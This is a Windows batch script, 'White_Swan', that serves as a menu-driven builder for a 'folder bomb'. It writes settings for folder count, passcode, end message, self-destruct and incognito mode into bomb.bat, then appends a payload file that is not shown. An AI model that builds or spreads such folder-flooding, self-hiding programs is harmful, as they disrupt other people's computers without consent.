@echo off
title White_Swan
cmdow.exe "White_Swan" /MAX
cmdow.exe "Administrator:  White_Swan" /MAX
mode con: cols=100 lines=40

SET PERCENTAGE==0

set folderlimit=DEFAULT [10]
set endmsg=FALSE
set passcode=no
SET PASS=DISABLED
set foldername=nul
set selfdestruct=FALSE

:start
COLOR 0E
cls
TYPE WSlogo.lmao
TYPE WSmenu.lmao
CHOICE/C:CE /N >NUL
IF ERRORLEVEL 2 CALL :EXIT
IF ERRORLEVEL 1 GOTO LOADINGASSETS

:EXIT
COLOR 0C
ECHO 				EXITING...
TIMEOUT /T 1 >NUL 
exit


:LOADINGASSETS
SET /A PERCENTAGE+=2
ECHO  				LOADING ASSETS... %PERCENTAGE%%%
ping localhost -n 1 -w 0 >nul
CALL :ECHOSTART

:LOADED_ASSETS

:ECHOSTART
cls
TYPE WSlogo.lmao
TYPE WSmenu.lmao
IF NOT %PERCENTAGE%==100 GOTO LOADINGASSETS
COLOR 0A
ECHO  				LOADING ASSETS... COMPLETE [*]
TIMEOUT /T 1 >NUL
GOTO CREATION

:CREATION
CLS
type WSlogo.lmao
echo.
ECHO 				[SETTINGS]
echo.
ECHO 				PASS PROTECTED = %PASS%
echo 				press P to set/disable
ECHO.
ECHO 				FOLDER LIMIT   = %FOLDERLIMIT%
echo 				press L to set
echo.
echo 				FOLDER NAME    = %FOLDERNAME%
echo 				press F to change
ECHO.
ECHO 				END MESSAGE    = %ENDMSG%
ECHO 				press M to set
echo.
echo 				SELF DESTRUCT  = %selfdestruct%
echo 				press D to change
echo.
echo 				PRESS C TO CREATE BOMB
echo.
echo 				PRESS E TO EXIT
ECHO.
CHOICE/C:IPLMEFDC /n >nul
IF ERRORLEVEL 8 GOTO CREATE
IF ERRORLEVEL 7 (
IF %selfdestruct%==TRUE SET selfdestruct=FALSE
IF %selfdestruct%==FALSE SET selfdestruct=TRUE
GOTO CREATION
)
IF ERRORLEVEL 6 CALL :FOLDERNAME
IF ERRORLEVEL 5 CALL :EXIT
IF ERRORLEVEL 4 CALL :MESSAGE
IF ERRORLEVEL 3 CALL :FOLDER_LIMIT
IF ERRORLEVEL 2 CALL :PASS_CODE
IF ERRORLEVEL 1 (
IF %INCOGNITO%==TRUE SET INCOGNITO=FALSE
IF %INCOGNITO%==FALSE SET INCOGNITO=TRUE
GOTO CREATION
)

:FOLDERNAME
echo 				Type 'random' to randomize name
SET /P foldername=-  				Set FOLDERNAME ^>^> 
if %foldername%==random set foldername=%random% && goto CREATION
set foldername=%foldername%
GOTO CREATION

:PASS_CODE
echo 				Type 'no' to disable
SET /P PASSCODE=-  				Set PASSCODE ^>^> 
if %PASSCODE%==no set pass=DISABLED && goto CREATION
set pass=ENABLED [PASSCODE = %passcode%]
GOTO CREATION

:FOLDER_LIMIT
echo 				Enter Amount of Folders Bomb will Create
SET /P FOLDERLIMIT=-  				Set FOLDERLIMIT ^>^> 
set /a FOLDERLIMIT=%folderlimit%
GOTO CREATION

:MESSAGE
echo 				Type 'no' to disable
SET /P "ENDMSG=-  				Set END MESSAGE ^>^> "
if "%ENDMSG%"=="no" set ENDMSG=FALSE && goto CREATION
set ENDMSG=%ENDMSG%
GOTO CREATION

:CREATE
echo set INCOGNITO=%incognito%>> bomb.bat
echo set selfdestruct=%selfdestruct%>> bomb.bat
echo set "endmsg=%endmsg%">> bomb.bat
if not %passcode%==no (
echo set passcode=%passcode%>> bomb.bat
)
if %passcode%==no (
echo set passcode=FALSE>> bomb.bat
)
if not "%folderlimit%"=="DEFAULT [10]" (
echo set folderlimit=%folderlimit%>> bomb.bat
)
if "%folderlimit%"=="DEFAULT [10]" (
echo set folderlimit=10>> bomb.bat
)
if "%foldername%"=="nul" (
echo set foldername=FALSE>> bomb.bat
)
if not "%foldername%"=="nul" (
echo set foldername=%foldername%>> bomb.bat
)
set load=0

:load
cls
set /a load+=1

echo CREATING BOMB . BAT [%load%%%]
if %load%==100 goto create01
ping localhost -n 1 -w 0 >nul
goto load

:create01
type bomb_code.txt >> bomb.bat
cd ..
move bin\bomb.bat bomb.bat
exit